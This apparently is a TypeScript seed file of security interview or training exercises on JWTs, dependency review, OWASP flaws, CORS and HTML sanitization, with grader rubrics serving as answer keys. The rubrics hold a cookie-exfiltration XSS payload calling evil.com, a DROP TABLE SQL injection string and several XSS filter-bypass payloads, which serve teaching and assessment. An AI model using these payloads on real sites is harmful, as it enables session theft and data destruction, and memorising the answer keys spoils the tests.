import { type SeedExercise, uuidv5 } from './types'

export const securityExercises: SeedExercise[] = [
  {
    id: uuidv5('exercise-014-jwt-misconception'),
    title: 'The JWT Misconception',
    description: `Your team ships a new feature: the mobile app reads the JWT on login to personalize the experience without an extra API call. The token now contains:

\`\`\`json
{
  "sub": "user-abc123",
  "email": "alex@example.com",
  "plan": "pro",
  "stripeCustomerId": "cus_9xyzABC",
  "paymentMethodLast4": "4242",
  "internalAdminNotes": "VIP — waived 2 chargebacks",
  "exp": 1748736000
}
\`\`\`

The mobile team lead says "it's signed so it's secure." A security-conscious engineer on your team flags it but isn't sure how to explain the issue clearly. Explain what is wrong. Define exactly what should and should not be in a JWT. Propose a revised approach for the mobile personalization use case.`,
    duration: 20,
    difficulty: 'medium',
    type: 'chat',
    category: 'security',
    languages: [],
    tags: ['security', 'jwt', 'authentication'],
    topics: ['jwt', 'authentication', 'authorization', 'encryption-vs-signing', 'sensitive-data', 'token-design'],
    variations: [
      {
        ownerRole: 'Security engineer who has reviewed hundreds of JWT implementations and written the company JWT standards document',
        ownerContext:
          "The core misconception: JWTs are **signed**, not **encrypted**. Anyone can base64-decode the payload and read its contents — no secret needed. The `stripeCustomerId`, `paymentMethodLast4`, and especially `internalAdminNotes` should never be in a JWT. The correct mental model: treat JWT claims as public data that you trust was issued by you (because of the signature), not data that is hidden. What belongs in a JWT: user identifier, roles/permissions, expiry. What does NOT belong: PII, financial data, internal notes, secrets. The fix for mobile personalization: keep the JWT minimal, make one extra API call on login to fetch profile data (it can be cached). Give credit for: explaining the base64-decodable nature of JWTs, distinguishing signing from encryption, and proposing a correct minimal token.",
      },
      {
        ownerRole: "Mobile team lead who genuinely believed JWTs were encrypted because 'they have a signature'",
        ownerContext:
          "Evaluate how well the developer explains the misconception to a non-security audience. Can they show concretely how to decode the JWT in 30 seconds (paste into jwt.io — no tools needed)? The `internalAdminNotes` field is the most egregious issue: any user can see their own admin notes by decoding their token. But the Stripe customer ID is also a real risk — combined with other data, it could facilitate fraud. Evaluate whether the developer addresses the mobile team lead's specific claim ('it's signed so it's secure') with a concrete counterexample, not just an abstract explanation. Give credit for explaining that signing guarantees *authenticity* (you issued it) but not *confidentiality* (nobody can read it). If encryption is needed, the standard is JWE — note whether the developer mentions it.",
      },
    ],
  },

  {
    id: uuidv5('exercise-015-dependency-audit'),
    title: 'The Dependency Audit',
    description: `You are reviewing this PR before it gets merged to main. The developer says "just a small cleanup plus one new feature." Identify every problem you find.

\`\`\`diff
// package.json
-  "dependencies": {
-    "express": "^4.18.2",
-    "pg": "^8.11.0"
-  },
-  "devDependencies": {
-    "jest": "^29.0.0",
-    "dotenv": "^16.0.0"
-  }
+  "dependencies": {
+    "express": "^4.18.2",
+    "pg": "^8.11.0",
+    "dotenv": "^16.0.0",
+    "jest": "^29.0.0",
+    "colors": "1.4.0"
+  }
\`\`\`

\`\`\`diff
// src/config.ts
+ const API_KEY = 'sk-prod-a8f3c2e1d7b4f9a2c8e1d7b4f9a2c8e1'
+ const DB_PASSWORD = 'hunter2'
+
  export const config = {
+   apiKey: API_KEY,
+   dbPassword: DB_PASSWORD,
    port: process.env['PORT'] ?? 3000,
  }
\`\`\`

\`\`\`diff
// .gitignore
  node_modules/
  dist/
- .env
\`\`\`

List every issue. Explain the severity and impact of each one.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'security',
    languages: ['typescript', 'javascript'],
    tags: ['security', 'code-review', 'dependencies'],
    topics: ['dependency-management', 'secrets-management', 'supply-chain-security', 'gitignore', 'devdependencies'],
    variations: [
      {
        ownerRole: 'Security engineer who does weekly dependency audits and has responded to two supply chain incidents in the past year',
        ownerContext:
          "There are four distinct issues. (1) `jest` and `dotenv` moved from devDependencies to dependencies — these will be installed in production, bloating the bundle and increasing attack surface. (2) `colors@1.4.0` is a known supply chain incident: the maintainer intentionally shipped a version with malicious code that entered infinite loops. Pinning to an exact version of a compromised package is actively harmful. (3) `API_KEY` and `DB_PASSWORD` are hardcoded in source — they are now in git history permanently, even if removed in a future commit. The secrets must be rotated immediately after being committed. (4) `.env` was removed from `.gitignore` — any developer who now runs with a local `.env` file will accidentally commit it on the next `git add .`. Evaluate whether the developer identifies all four, rates the severity correctly (hardcoded secrets + .gitignore removal are critical; dependency misclassification is medium; colors is high), and knows that rotating secrets is the only fix once they've been committed.",
      },
      {
        ownerRole: 'Senior developer who reviews 15+ PRs per week and has a checklist for security-sensitive changes',
        ownerContext:
          "Evaluate the developer's code review completeness and their ability to explain business impact. Finding the issues is the baseline — explaining severity is the real skill. The hardcoded API_KEY should trigger an immediate conversation: 'This key may already be compromised if this PR was pushed to a shared branch. We need to rotate it now, not after merge.' The `.gitignore` issue is subtle but critical: the developer may not realize that removing `.env` from `.gitignore` affects every team member's local environment on next pull. Give credit for: identifying all four issues, explaining the `colors` supply chain risk specifically (not just 'pinned version is bad'), and recommending concrete next steps for the hardcoded secrets.",
      },
    ],
  },

  {
    id: uuidv5('exercise-053-owasp-top-ten'),
    title: 'The OWASP Code Review',
    description: `You are reviewing a new Express.js API endpoint. The developer says "it works great in staging." Find every security vulnerability.

\`\`\`typescript
app.post('/api/admin/users', async (req, res) => {
  const { email, role, redirectUrl } = req.body

  // Create user
  const result = await db.query(
    \`INSERT INTO users (email, role) VALUES ('\${email}', '\${role}') RETURNING id\`
  )

  // Send welcome email with login link
  await sendEmail({
    to: email,
    subject: 'Welcome!',
    html: \`<a href="\${redirectUrl}/login?userId=\${result.rows[0].id}">Click to login</a>\`
  })

  // Log for audit
  await db.query(
    \`INSERT INTO audit_log (action, details) VALUES ('user_created', '\${JSON.stringify(req.body)}')\`
  )

  res.json({ id: result.rows[0].id, message: \`User \${email} created\` })
})
\`\`\`

List every vulnerability, its OWASP Top 10 category, the attack vector, and the fix.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'security',
    languages: ['typescript', 'javascript'],
    tags: ['security', 'owasp', 'code-review'],
    topics: ['sql-injection', 'xss', 'open-redirect', 'owasp-top-10', 'input-validation', 'parameterized-queries'],
    variations: [
      {
        ownerRole: 'Application security engineer who has conducted 100+ code reviews and can identify vulnerabilities by pattern recognition',
        ownerContext:
          "Multiple vulnerabilities to identify: (1) SQL Injection (A03:2021) — string interpolation in SQL queries. Attack: `email = \"'; DROP TABLE users; --\"`. Fix: parameterized queries. (2) SQL Injection in audit_log — same problem, JSON.stringify doesn't prevent SQL injection. (3) Open Redirect (part of A01:2021) — `redirectUrl` from user input goes directly into the email link. Attack: attacker sets `redirectUrl` to a phishing site. Fix: validate against an allowlist of permitted domains. (4) XSS via email (A03:2021) — `email` is injected into HTML without escaping. Attack: `email = \"<script>document.location='evil.com?c='+document.cookie</script>\"`. Fix: HTML-escape all user input in templates. (5) No authentication/authorization check — the endpoint is `/api/admin/users` but there's no middleware checking if the caller is an admin. (6) Mass assignment — `role` comes from the request body, allowing a caller to set `role = 'admin'`. Evaluate whether the developer identifies at least 4 of these 6 vulnerabilities. Give credit for correct OWASP categorization and concrete attack examples.",
      },
      {
        ownerRole: 'Senior developer who has learned security through production incidents and considers every vulnerability a potential incident report',
        ownerContext:
          "Evaluate the developer's ability to explain the IMPACT of each vulnerability, not just its existence. The SQL injection isn't just 'bad practice' — it means an attacker can read every user's email, delete tables, or escalate privileges. The missing auth check means any unauthenticated user can create admin accounts. Evaluate whether the developer prioritizes the fixes by severity: (1) missing auth check (immediate exploit, no technical skill required); (2) SQL injection (data breach, full database compromise); (3) open redirect (phishing vector for existing users); (4) XSS in email (account takeover via email clients that render HTML). Give credit for: correct severity ordering, concrete attack scenarios, and proposing both immediate fixes (parameterized queries, add auth middleware) and systemic fixes (use an ORM that prevents SQL injection by default, add CSP headers, input validation middleware).",
      },
    ],
  },

  {
    id: uuidv5('exercise-054-jwt-implementation'),
    title: 'The JWT Authentication Flow',
    description: `Implement a complete JWT authentication flow for a REST API. The requirements:

- Login endpoint: accepts email + password, returns access token + refresh token
- Access token: expires in 15 minutes, contains user ID and roles
- Refresh token: expires in 7 days, stored in the database, can be revoked
- Protected endpoint middleware: validates the access token and injects user context
- Refresh endpoint: accepts a refresh token, returns a new access token
- Logout endpoint: revokes the refresh token

\`\`\`typescript
// Implement these:
async function login(email: string, password: string): Promise<TokenPair> { /* ... */ }
async function refresh(refreshToken: string): Promise<TokenPair> { /* ... */ }
async function logout(refreshToken: string): Promise<void> { /* ... */ }
function authMiddleware(req: Request, res: Response, next: NextFunction): void { /* ... */ }
\`\`\`

Show the implementation. Explain: (1) why access tokens are short-lived, (2) why refresh tokens are stored server-side, (3) how you would handle token rotation (new refresh token on each refresh call).`,
    duration: 25,
    difficulty: 'hard',
    type: 'code',
    category: 'security',
    languages: ['typescript', 'python'],
    tags: ['security', 'jwt', 'authentication'],
    topics: ['jwt', 'refresh-tokens', 'token-rotation', 'bcrypt', 'middleware', 'authentication-flow'],
    variations: [
      {
        ownerRole: 'Security architect who has designed auth systems for banks and healthcare companies with strict compliance requirements',
        ownerContext:
          "Evaluate the implementation for security correctness. Key points: (1) passwords must be hashed with bcrypt (not SHA-256, not md5) and compared with constant-time comparison; (2) access tokens should use RS256 (asymmetric) for production, HS256 is acceptable for this exercise; (3) refresh tokens should be opaque (random bytes), not JWTs — they don't need to carry claims, they're just lookup keys; (4) token rotation: each refresh call should invalidate the old refresh token and issue a new one — this detects token theft (if a stolen token is used after the legitimate user already refreshed, both tokens are invalidated). Evaluate: does the middleware handle expired tokens correctly (401, not 403)? Does login hash the password before comparing? Does the implementation prevent timing attacks on token validation? Give credit for: correct password handling, token rotation with theft detection, and proper HTTP status codes (401 for auth failure, 403 for insufficient permissions).",
      },
      {
        ownerRole: 'Frontend developer who needs to integrate with this auth API and wants clear, predictable behavior from every endpoint',
        ownerContext:
          "Evaluate from the consumer's perspective. The auth flow should be: (1) login returns both tokens — access token in the response body, refresh token as an httpOnly cookie (not in localStorage — XSS risk); (2) on 401 response, the client calls the refresh endpoint automatically; (3) on refresh failure (expired refresh token), redirect to login; (4) logout clears both tokens. Evaluate whether the developer considers: where tokens are stored on the client (httpOnly cookies for refresh, memory for access — never localStorage), how the frontend handles concurrent requests when the access token expires (queue requests while refreshing, retry after refresh), and what happens when the user has multiple tabs open (all tabs need to detect the logout from one tab). Give credit for: httpOnly cookie for refresh token, clear error responses, and thinking about the multi-tab scenario.",
      },
    ],
  },

  {
    id: uuidv5('exercise-055-cors-policy'),
    title: 'The CORS Misconfiguration',
    description: `Your API serves a React frontend at \`app.example.com\`. A developer configured CORS like this:

\`\`\`typescript
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['*']
}))
\`\`\`

A security audit flagged this configuration. Explain: (1) what CORS is and why it exists, (2) every problem with this configuration, (3) the correct configuration for this use case. Then answer: "A developer on my team says CORS is 'just a browser thing' and doesn't protect the API. Are they right?"`,
    duration: 15,
    difficulty: 'easy',
    type: 'chat',
    category: 'security',
    languages: [],
    tags: ['security', 'cors', 'web-security'],
    topics: ['cors', 'same-origin-policy', 'preflight-requests', 'credentials', 'browser-security', 'csrf'],
    variations: [
      {
        ownerRole: 'Security engineer who has exploited CORS misconfigurations in penetration tests and knows exactly how attackers abuse them',
        ownerContext:
          "Evaluate the developer's understanding of CORS mechanics. Problems with the configuration: (1) `origin: '*'` with `credentials: true` is INVALID — browsers reject this combination (you cannot use wildcard origin with credentials). If the server actually sends `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`, no browser will send cookies. However, some CORS libraries 'helpfully' reflect the request's Origin header instead of sending `*` when credentials are true — this effectively allows ANY origin with credentials, which is the worst possible configuration. (2) `allowedHeaders: ['*']` may not work as expected in all browsers for preflight requests. The correct configuration: `origin: 'https://app.example.com'` (or a validated allowlist), `credentials: true`, specific methods and headers. For the 'just a browser thing' question: the developer is partially right — CORS is enforced by browsers, not servers. But it protects against CSRF-style attacks where a malicious website makes credentialed requests to your API using the user's cookies. Give credit for: explaining the origin reflection vulnerability, correct CORS configuration, and a nuanced answer to the 'browser thing' question.",
      },
      {
        ownerRole: 'Backend developer who has spent 4 hours debugging CORS errors and eventually set everything to wildcard out of frustration',
        ownerContext:
          "Evaluate empathy and education ability. The developer who set `origin: '*'` was probably frustrated by CORS errors during development. Evaluate whether the candidate: (1) explains WHY CORS exists (same-origin policy prevents malicious sites from reading API responses on behalf of the user); (2) provides a correct configuration that works (not just 'don't use wildcards' but the actual correct config); (3) addresses the development experience — use a different CORS config for development (allow localhost) vs. production (strict origin list); (4) explains preflight requests clearly (browsers send OPTIONS before POST/PUT/DELETE with custom headers — the server must respond correctly). Give credit for: a clear explanation accessible to someone who sees CORS as 'that annoying error,' a working production configuration, and a development configuration that avoids the frustration that led to the wildcard in the first place.",
      },
    ],
  },

  {
    id: uuidv5('exercise-056-input-sanitization'),
    title: 'The Input Sanitization Challenge',
    description: `Your content platform allows users to write posts with rich text (bold, italic, links, images). The posts are stored as HTML and rendered on other users' pages. A security researcher reported that they can execute JavaScript in other users' browsers by posting specially crafted content.

The current sanitization:

\`\`\`typescript
function sanitizeHTML(input: string): string {
  return input
    .replace(/<script>/gi, '')
    .replace(/<\\/script>/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/on\\\\w+=/gi, '')
}
\`\`\`

This is a blocklist approach. Demonstrate why it fails (provide at least 3 bypass payloads). Then implement a proper sanitization strategy. Explain the fundamental difference between blocklisting and allowlisting for security.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'security',
    languages: ['typescript', 'javascript'],
    tags: ['security', 'xss', 'sanitization'],
    topics: ['xss', 'html-sanitization', 'allowlist-vs-blocklist', 'dompurify', 'content-security-policy', 'defense-in-depth'],
    variations: [
      {
        ownerRole: 'Penetration tester who has bypassed HTML sanitization filters in 30+ web applications and has a personal collection of XSS payloads',
        ownerContext:
          "Evaluate bypass knowledge and the proposed fix. Bypass payloads: (1) `<scr<script>ipt>alert(1)</script>` — the inner `<script>` is removed, leaving a valid `<script>` tag; (2) `<img src=x onerror=alert(1)>` — the regex `on\\\\w+=` requires `=` immediately after the event name, but `onerror =` (with a space) or `onerror\\t=` (with a tab) bypasses it; (3) `<a href='java&#115;cript:alert(1)'>click</a>` — HTML entity encoding bypasses the plaintext `javascript:` check; (4) `<svg/onload=alert(1)>` — SVG elements also support event handlers; (5) `<iframe src='data:text/html,<script>alert(1)</script>'>`. The fix: use an allowlist-based sanitizer like DOMPurify that parses the HTML into a DOM tree, walks it, and only keeps allowed tags and attributes. Never regex-based sanitization for HTML. Give credit for: at least 3 working bypass payloads, recommending DOMPurify or similar, and explaining why blocklisting fundamentally cannot work for HTML (the HTML spec is too large and too flexible).",
      },
      {
        ownerRole: 'Senior developer who was responsible for the XSS vulnerability that the security researcher found and needs to fix it without breaking the rich text feature',
        ownerContext:
          "Evaluate the fix for both security and functionality. The developer must: (1) replace the regex sanitizer with DOMPurify or a similar parsed-HTML sanitizer; (2) define an allowlist of tags (p, br, strong, em, a, img, ul, ol, li, h1-h3) and attributes (href on a, src on img, alt on img — NO event handlers, NO style attributes); (3) for links, validate that href starts with `https://` or `http://` — no `javascript:`, `data:`, or `vbscript:` protocols; (4) add Content-Security-Policy header as defense-in-depth (`script-src 'self'` prevents inline scripts even if sanitization is bypassed). Evaluate whether the developer tests their fix against the bypass payloads. Give credit for: using a proven library (not writing a custom sanitizer), a restrictive allowlist, CSP as a backup layer, and acknowledging that they need to re-sanitize all existing content in the database (old posts may contain malicious HTML).",
      },
    ],
  },
]
